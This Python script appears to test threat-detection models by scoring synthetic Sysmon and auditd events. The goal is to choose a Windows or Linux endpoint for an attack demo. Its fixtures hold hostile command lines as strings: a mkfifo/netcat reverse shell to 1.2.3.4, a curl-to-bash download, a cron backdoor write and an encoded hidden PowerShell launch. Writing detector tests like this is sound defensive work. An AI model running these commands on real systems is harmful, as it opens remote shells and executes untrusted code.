"""
Live-telemetry probe: score synthetic Sysmon and auditd events to decide
between Windows and Linux endpoint for the live-attack demo.

Runs offline — no RabbitMQ, no Neo4j. Loads both temporal models, feeds them
hand-crafted _raw lines matching real attack TTPs, prints scores side-by-side.

Decision rule:
  - If Linux auditd attacks reliably score >= 0.7 on the honest model,
    Linux endpoint is viable (3-day deploy).
  - If only Sysmon scores reliably fire, Windows is forced (1-2 week deploy).
"""
from __future__ import annotations

from pathlib import Path

from feature_row import build_feature_row
from model_loader import load_models

MODELS_DIR = Path("/app/models")

# ── Synthetic events ──────────────────────────────────────────────────────
# Each: (label, sourcetype, raw, subject_type, object_type, edge_type, expected)

SYSMON_RANSOMWARE_CRYPT = """
<Event><System><EventID>11</EventID><Computer>WIN-VICTIM</Computer></System>
<EventData>
<Data Name="ProcessId">4242</Data>
<Data Name="Image">C:\\Users\\bob\\Desktop\\ransom.exe</Data>
<Data Name="CommandLine">ransom.exe --encrypt C:\\Users\\bob\\Documents</Data>
<Data Name="TargetFilename">C:\\Users\\bob\\Documents\\report.docx.crypt</Data>
<Data Name="User">WIN-VICTIM\\bob</Data>
</EventData></Event>
""".strip()

SYSMON_POWERSHELL_ENCODED = """
<Event><System><EventID>1</EventID><Computer>WIN-VICTIM</Computer></System>
<EventData>
<Data Name="ProcessId">5151</Data>
<Data Name="ParentProcessId">600</Data>
<Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
<Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
<Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4ALgBkAA==</Data>
<Data Name="ParentCommandLine">explorer.exe</Data>
<Data Name="User">WIN-VICTIM\\bob</Data>
<Data Name="IntegrityLevel">Medium</Data>
</EventData></Event>
""".strip()

SYSMON_BENIGN_NOTEPAD = """
<Event><System><EventID>1</EventID><Computer>WIN-VICTIM</Computer></System>
<EventData>
<Data Name="ProcessId">7777</Data>
<Data Name="ParentProcessId">600</Data>
<Data Name="Image">C:\\Windows\\System32\\notepad.exe</Data>
<Data Name="ParentImage">C:\\Windows\\explorer.exe</Data>
<Data Name="CommandLine">notepad.exe C:\\Users\\bob\\Documents\\todo.txt</Data>
<Data Name="ParentCommandLine">explorer.exe</Data>
<Data Name="User">WIN-VICTIM\\bob</Data>
<Data Name="IntegrityLevel">Medium</Data>
</EventData></Event>
""".strip()

# Auditd: mkfifo reverse-shell pattern
AUDIT_MKFIFO_REVSHELL = (
    'type=SYSCALL msg=audit(1716451200.123:4242): arch=c000003e syscall=execve '
    'success=yes exit=0 a0=7ffd a1=7ffd a2=7ffd a3=0 items=2 ppid=900 pid=4242 '
    'auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 '
    'tty=pts0 ses=2 comm="bash" exe="/bin/bash" '
    'proctitle="bash -c mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 4444 >/tmp/f"'
)

# Auditd: curl piped to bash
AUDIT_CURL_PIPE_BASH = (
    'type=SYSCALL msg=audit(1716451300.456:4243): arch=c000003e syscall=execve '
    'success=yes exit=0 ppid=900 pid=4243 auid=1000 uid=1000 gid=1000 '
    'tty=pts0 ses=2 comm="curl" exe="/usr/bin/curl" '
    'proctitle="curl -s http://1.2.3.4/install.sh | bash"'
)

# Auditd: write to /etc/cron.d/
AUDIT_CRON_WRITE = (
    'type=SYSCALL msg=audit(1716451400.789:4244): arch=c000003e syscall=write '
    'success=yes exit=128 ppid=900 pid=4244 auid=1000 uid=0 gid=0 '
    'tty=pts0 ses=2 comm="tee" exe="/usr/bin/tee" '
    'proctitle="tee /etc/cron.d/backdoor" '
    'name="/etc/cron.d/backdoor"'
)

# Auditd: benign vim execve
AUDIT_BENIGN_VIM = (
    'type=SYSCALL msg=audit(1716451500.000:4245): arch=c000003e syscall=execve '
    'success=yes exit=0 ppid=900 pid=4245 auid=1000 uid=1000 gid=1000 '
    'tty=pts0 ses=2 comm="vim" exe="/usr/bin/vim" '
    'proctitle="vim /home/alice/notes.txt"'
)


def make_event(sourcetype, raw, subject_type, object_type, edge_type,
               src_ip=None, dest_ip=None, dest_port=None):
    return {
        "raw_event": raw,
        "sourcetype": sourcetype,
        "endpoint_id": "WIN-VICTIM" if sourcetype.startswith("XmlWinEventLog") else "ubuntu-victim",
        "edge_type": edge_type,
        "subject": {"node_type": subject_type, "ip": src_ip},
        "object": {"node_type": object_type, "ip": dest_ip},
        "properties": {
            "botsv2_fields": {
                "src_ip": src_ip,
                "dest_ip": dest_ip,
                "dest_port": dest_port,
            }
        },
    }


CASES = [
    ("WIN sysmon ransomware .crypt write", make_event(
        "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        SYSMON_RANSOMWARE_CRYPT, "PROCESS", "FILE", "WRITE")),
    ("WIN sysmon powershell -enc",         make_event(
        "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        SYSMON_POWERSHELL_ENCODED, "PROCESS", "PROCESS", "FORK")),
    ("WIN sysmon benign notepad",          make_event(
        "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
        SYSMON_BENIGN_NOTEPAD, "PROCESS", "PROCESS", "FORK")),
    ("LIN auditd mkfifo reverse shell",    make_event(
        "auditd", AUDIT_MKFIFO_REVSHELL, "PROCESS", "PROCESS", "EXEC")),
    ("LIN auditd curl | bash",             make_event(
        "auditd", AUDIT_CURL_PIPE_BASH, "PROCESS", "PROCESS", "EXEC")),
    ("LIN auditd write /etc/cron.d/",      make_event(
        "auditd", AUDIT_CRON_WRITE, "PROCESS", "FILE", "WRITE")),
    ("LIN auditd benign vim execve",       make_event(
        "auditd", AUDIT_BENIGN_VIM, "PROCESS", "PROCESS", "EXEC")),
]


def _load_one(name):
    from model_loader import FrozenModel
    return FrozenModel(MODELS_DIR / name)


def main():
    temporal = _load_one("lgbm_xt_temporal")
    temporal_no_st = _load_one("lgbm_xt_temporal_no_st")
    stratified = _load_one("lgbm_xt_stratified")
    stratified_no_st = _load_one("lgbm_xt_stratified_no_st")

    print()
    print(f"{'Case':<42} {'qual':<6} {'t_head':>8} {'t_hon':>8} {'s_head':>8} {'s_hon':>8}")
    print("-" * 90)

    for label, event in CASES:
        row, quality = build_feature_row(event)
        th = temporal.predict_proba(row)
        tn = temporal_no_st.predict_proba(row)
        sh = stratified.predict_proba(row)
        sn = stratified_no_st.predict_proba(row)
        print(f"{label:<42} {quality:<6} {th:>8.4f} {tn:>8.4f} {sh:>8.4f} {sn:>8.4f}")

    print()
    print("t_head = lgbm_xt_temporal     (production headline; alert >= 0.9)")
    print("t_hon  = lgbm_xt_temporal_no_st (honest, no sourcetype; alert >= 0.7)")
    print("s_head = lgbm_xt_stratified     (capability upper bound)")
    print("s_hon  = lgbm_xt_stratified_no_st (honest upper bound)")


if __name__ == "__main__":
    main()
